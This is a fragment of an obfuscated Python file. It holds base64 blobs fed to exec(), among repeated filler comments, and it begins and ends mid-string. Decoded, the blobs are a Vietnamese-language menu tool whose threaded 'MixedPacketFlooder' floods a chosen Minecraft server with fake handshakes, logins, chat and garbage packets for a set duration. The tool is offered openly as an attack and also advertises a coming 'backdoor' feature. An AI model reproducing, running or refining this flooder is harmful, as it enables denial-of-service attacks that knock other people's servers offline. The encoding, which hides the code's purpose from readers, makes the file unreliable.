ElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpc